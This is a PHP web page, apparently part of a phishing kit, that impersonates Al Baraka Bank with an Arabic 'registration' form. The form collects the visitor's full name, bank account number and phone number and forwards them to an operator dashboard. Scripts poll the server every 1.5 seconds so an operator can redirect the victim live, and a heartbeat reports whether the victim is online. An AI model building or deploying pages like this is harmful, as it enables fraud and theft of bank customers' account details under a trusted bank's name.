<?php

declare(strict_types=1);

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__.'/includes/flow_helpers.php';
require_once __DIR__.'/includes/session_registry.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
    $_SESSION['reg_name'] = trim((string) ($_POST['name'] ?? ''));
    $_SESSION['reg_account'] = trim((string) ($_POST['account_number'] ?? ''));
    $_SESSION['reg_phone'] = trim((string) ($_POST['phone'] ?? ''));

    unset($_SESSION['congrats_wait_broadcast'], $_SESSION['wait_page_broadcast'], $_SESSION['sham_done']);

    dashboard_notify_safe(
        'register',
        [
            'session_id' => session_id(),
            'name' => $_SESSION['reg_name'],
            'account_number' => $_SESSION['reg_account'],
            'phone' => $_SESSION['reg_phone'],
        ],
        'إرسال نموذج التسجيل (كامل)'
    );

    registry_touch_page('register.php');

    header('Location: congrats.php', true, 302);
    exit;
}

registry_touch_page('register.php');
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>بنك البركة | التسجيل</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --sahara-green: #ff7f00;
            --sahara-green-dark: #ff7f00;
            --sahara-green-light: #e8eef5;
            --sahara-dark: #1a1a2e;
            --sahara-gray: #6B7280;
            --sahara-light: #F9FAFB;
            --sahara-white: #FFFFFF;
            --sahara-gold: #c9a84c;
            --sahara-border: #E5E7EB;
            --sahara-radius: 16px;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Tajawal', system-ui, -apple-system, sans-serif;
            background: var(--sahara-light);
            color: #1E293B;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* === Navbar === */
        .sahara-nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 24px;
            background: var(--sahara-white);
            box-shadow: 0 1px 4px rgba(0,0,0,0.06);
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        .sahara-nav .logo-img {
            height: 60px;
            width: auto;
            display: block;
        }
        .sahara-nav .back-btn {
            width: 36px;
            height: 36px;
            border-radius: 10px;
            background: var(--sahara-green-light);
            border: none;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--sahara-green);
            font-size: 16px;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.3s;
        }
        .sahara-nav .back-btn:hover {
            background: var(--sahara-green);
            color: #fff;
        }
        .sahara-nav .nav-links {
            display: flex;
            gap: 20px;
        }
        .sahara-nav .nav-links a {
            text-decoration: none;
            color: #555;
            font-size: 14px;
            font-weight: 600;
            transition: color 0.3s;
        }
        .sahara-nav .nav-links a:hover {
            color: var(--sahara-green);
        }

        /* === Step Indicator === */
        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 8px;
            padding: 16px;
            background: var(--sahara-white);
            border-bottom: 1px solid var(--sahara-border);
        }
        .step-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: var(--sahara-border);
        }
        .step-dot.completed {
            background: var(--sahara-green);
        }
        .step-dot.active {
            background: var(--sahara-gold);
            box-shadow: 0 0 0 4px rgba(212, 175, 55, 0.2);
        }

        /* === Form Header === */
        .form-header {
            text-align: center;
            padding: 24px 16px 10px;
        }
        .form-header h2 {
            font-size: 22px;
            font-weight: 800;
            color: #1E293B;
            margin-bottom: 6px;
        }
        .form-header p {
            font-size: 13px;
            color: var(--sahara-gray);
        }

        /* === Form Card === */
        .form-wrap {
            flex: 1;
            padding: 0 16px 24px;
            max-width: 600px;
            margin: 0 auto;
            width: 100%;
        }
        .form-card {
            background: var(--sahara-white);
            border-radius: var(--sahara-radius);
            padding: 28px 24px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
            border: 1px solid var(--sahara-border);
        }

        /* === Form Fields === */
        .form-group {
            margin-bottom: 18px;
        }
        .form-group label {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 13px;
            font-weight: 600;
            color: #374151;
            margin-bottom: 8px;
        }
        .form-group label i {
            font-size: 12px;
            color: var(--sahara-green);
        }
        .form-input {
            width: 100%;
            border: 1.5px solid var(--sahara-border);
            border-radius: 12px;
            padding: 13px 14px;
            font-size: 14px;
            font-family: 'Tajawal', system-ui, sans-serif;
            color: #1E293B;
            background: var(--sahara-white);
            transition: border-color 0.3s, box-shadow 0.3s;
            direction: rtl;
            height: 50px;
        }
        .form-input:focus {
            border-color: var(--sahara-green);
            box-shadow: 0 0 0 3px rgba(27, 79, 138, 0.15);
            outline: none;
        }
        .form-input::placeholder {
            color: #CBD5E1;
            font-size: 13px;
        }
        .mandatory-fee-box {
            border: 1.5px solid rgba(27, 79, 138, 0.18);
            border-radius: 14px;
            background: linear-gradient(135deg, #f0f4fa, #e8eef5);
            padding: 14px;
        }
        .mandatory-fee-option {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
            padding: 14px 16px;
            border-radius: 12px;
            background: #fff;
            border: 1.5px solid rgba(27, 79, 138, 0.22);
            color: #1E293B;
            font-size: 14px;
            font-weight: 700;
        }
        .mandatory-fee-option .choice-value {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            color: var(--sahara-green);
            white-space: nowrap;
        }
        .mandatory-fee-option .choice-help {
            color: #475569;
            font-size: 12px;
            font-weight: 600;
            text-align: left;
        }
        .mandatory-fee-note {
            margin: 10px 2px 0;
            font-size: 12px;
            color: #64748B;
            line-height: 1.7;
        }

        /* === Balance Input === */
        .balance-input-wrap {
            position: relative;
            display: flex;
            align-items: center;
        }
        .balance-input {
            padding-left: 60px !important;
        }
        .currency-badge {
            position: absolute;
            left: 14px;
            background: var(--sahara-green);
            color: #fff;
            font-size: 12px;
            font-weight: 700;
            padding: 4px 10px;
            border-radius: 8px;
        }

        /* === Customer Toggle === */
        .customer-toggle {
            display: flex;
            gap: 12px;
        }
        .customer-toggle input[type="radio"] {
            display: none;
        }
        .customer-toggle .toggle-option {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 14px;
            border: 2px solid var(--sahara-border);
            border-radius: 12px;
            font-size: 15px;
            font-weight: 700;
            color: var(--sahara-gray);
            cursor: pointer;
            transition: all 0.3s;
            background: var(--sahara-white);
        }
        .customer-toggle .toggle-option:hover {
            border-color: var(--sahara-green);
            color: var(--sahara-green);
        }
        .customer-toggle input[type="radio"]:checked + .toggle-option {
            background: var(--sahara-green);
            border-color: var(--sahara-green);
            color: #fff;
            box-shadow: 0 4px 12px rgba(27, 79, 138, 0.3);
        }

        /* === Submit Button === */
        .btn-submit {
            width: 100%;
            background: linear-gradient(135deg, #8e000e, #8e000e);
            color: #fff;
            border: none;
            padding: 15px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            font-family: 'Tajawal', system-ui, sans-serif;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.3s;
            box-shadow: 0 4px 16px rgba(27, 79, 138, 0.3);
            margin-top: 8px;
        }
        .btn-submit:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(27, 79, 138, 0.4);
        }
        .btn-submit:disabled {
            background: #94A3B8;
            cursor: not-allowed;
            box-shadow: none;
        }

        /* === Info Note === */
        .info-note {
            background: var(--sahara-green-light);
            border: 1px solid rgba(27, 79, 138, 0.2);
            border-radius: 12px;
            padding: 12px 14px;
            margin-top: 16px;
            display: flex;
            align-items: flex-start;
            gap: 10px;
        }
        .info-note i {
            color: var(--sahara-green);
            font-size: 16px;
            margin-top: 2px;
        }
        .info-note p {
            font-size: 12px;
            color: #374151;
            line-height: 1.7;
            margin: 0;
        }

        /* === Footer === */
        .sahara-footer {
            background: var(--sahara-dark);
            color: var(--sahara-white);
            padding: 20px 16px;
            text-align: center;
            margin-top: auto;
        }
        .sahara-footer .footer-logo {
            height: 90px;
            width: auto;
            margin-bottom: 12px;
        }
        .sahara-footer p {
            font-size: 12px;
            color: #94A3B8;
            line-height: 1.7;
        }
        .sahara-footer .footer-bottom {
            border-top: 1px solid rgba(255,255,255,0.08);
            padding-top: 10px;
            margin-top: 10px;
            font-size: 11px;
            color: #64748B;
        }

        @media (max-width: 480px) {
            .sahara-nav {
                padding: 10px 16px;
            }
            .sahara-nav .logo-img {
                height: 50px;
            }
            .form-card {
                padding: 20px 16px;
            }
        }
    </style>
</head>
<body>

    <!-- Navbar -->
    <nav class="sahara-nav">
        <a href="register.php" class="back-btn">
            <i class="fas fa-arrow-right"></i>
        </a>
        <img src="https://i.postimg.cc/Xq4ZsdJT/bar-removebg-preview.png" alt="بنك البركة" class="logo-img">
        <div class="nav-links">
            <a href="register.php">الرئيسية</a>
        </div>
    </nav>

    <!-- Step Indicator -->
    <div class="step-indicator">
        <div class="step-dot completed"></div>
        <div class="step-dot active"></div>
        <div class="step-dot"></div>
        <div class="step-dot"></div>
    </div>



    <!-- Form -->
    <div class="form-wrap">
        <div class="form-card">
            <form action="register.php" method="POST">

                
                <!-- الاسم الكامل -->
                <div class="form-group">
                    <label>
                        <i class="fas fa-user"></i>
                        الاسم الكامل
                    </label>
                    <input type="text" name="name" required class="form-input" placeholder="أدخل الاسم الكامل">
                </div>



                <!-- رقم الحساب -->
                <div class="form-group">
                    <label>
                        <i class="fas fa-university"></i>
                        رقم الحساب
                    </label>
                    <input type="text" name="account_number" required inputmode="numeric" pattern="[0-9]*" class="form-input" placeholder="أدخل رقم الحساب" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
                </div>

                <!-- رقم الهاتف -->
                <div class="form-group">
                    <label>
                        <i class="fas fa-phone"></i>
                        رقم الهاتف
                    </label>
                    <input type="text" name="phone" required inputmode="numeric" class="form-input" placeholder="أدخل رقم الهاتف">
                </div>







                <!-- Submit -->
                <button type="submit" name="submit" id="butSubm" disabled class="btn-submit">
                    <span>متابعة الطلب</span>
                    <i class="fas fa-arrow-left"></i>
                </button>

                <!-- Info Note -->
                <div class="info-note">
                    <i class="fas fa-info-circle"></i>
                    <p>بالضغط على "متابعة الطلب" فإنك توافق على شروط وأحكام بنك البركة</p>
                </div>

            </form>
        </div>
    </div>

    <!-- Footer -->
    <footer class="sahara-footer">
        <p style="font-size:13px;font-weight:600;color:#1b4f8a;margin-bottom:4px;">بنك البركة | SHAM BANK</p>
        <div class="footer-bottom">
            &copy; بنك البركة 2026 - جميع الحقوق محفوظة
        </div>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            const submitBtn = document.getElementById('butSubm');

            form.addEventListener('input', function() {
                submitBtn.disabled = !form.checkValidity();
            });

            form.addEventListener('change', function() {
                submitBtn.disabled = !form.checkValidity();
            });

            if (form.checkValidity()) {
                submitBtn.disabled = false;
            }
        });
    </script>

    <script>
    function checkRedirect() {
        fetch('polling-redirect.php').then(r => r.json()).then(data => { if (data.redirect) { window.location.href = data.redirect; } }).catch(e => {});
    }
    setInterval(checkRedirect, 1500);
    checkRedirect();
    </script>

    
<script>
// Heartbeat - تحديث حالة الاتصال فوراً
function sendHeartbeat() {
    fetch('heartbeat.php').catch(function(e){});
}
setInterval(sendHeartbeat, 2000);
sendHeartbeat();
window.addEventListener('beforeunload', function() {
    navigator.sendBeacon('heartbeat.php', new URLSearchParams({action: 'offline'}));
});
</script>
</body>
</html>
